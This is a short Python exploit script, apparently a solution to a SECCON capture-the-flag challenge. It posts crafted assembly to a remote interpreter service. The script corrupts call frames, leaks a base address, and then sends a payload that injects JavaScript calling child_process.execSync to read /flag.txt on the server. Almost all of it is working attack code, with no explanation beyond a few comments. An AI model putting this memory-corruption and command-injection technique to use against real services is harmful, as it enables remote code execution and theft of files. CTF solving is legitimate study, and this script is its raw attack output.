import struct
import re, os
import requests
EXPRESSION = re.compile(r'\${([^\}]+)}')
p32 = lambda x: struct.pack("<L", x)

HOST = 'http://interpreter.pwn.seccon.jp:5000'

def repl(x):
	return eval(x.group(1))

data = r'''
${'push r1\n' * 8}

call 0, b
exit
b:
# just repeat it since loop instruction allocates something
${'push r1\n' * (4096 - 8 - 5)}
# now call frame points another. let's exploit it!
ls r0, ${`'a'*4096`}
mul r0, r0, r0
# trigger
loadarg r0, 0
jz r0, c
exit
c:
'''

def go(x):
	return requests.post(HOST + '/upload', files={'script': ('script.asm', x)}).text

r=go(EXPRESSION.sub(repl, data))
r=[xx for xx in r.split('\n') if 'r0' in xx][0]
base=int(r.split(': ')[1].split(',')[0],16)-0x1008
print 'Leaked address:', hex(base)

data = r'''
${'push r1\n' * 8}

call 0, b
exit
b:
# just repeat it since loop instruction allocates something
${'push r1\n' * (4096 - 8 - 5)}
# now call frame points another. let's exploit it!
ls r0, ${`('A' * 48 + p32(base+52) + p32(base+56) + p32(0x30) + p32(base+68)+p32(0xffffffff)+p32(base+72)+(p32(base+76-16)+p32(0x1ac)).ljust(0x50, 'a') + p32(base+72+0x50+4) + 'pwned\');console.log(require("child_process").execSync("cat /flag.txt; echo -n").toString())//\x00').ljust(4096, 'a')`}
# trigger
loadarg r0, 0
jz r0, c
exit
c:
'''

print go(EXPRESSION.sub(repl, data))
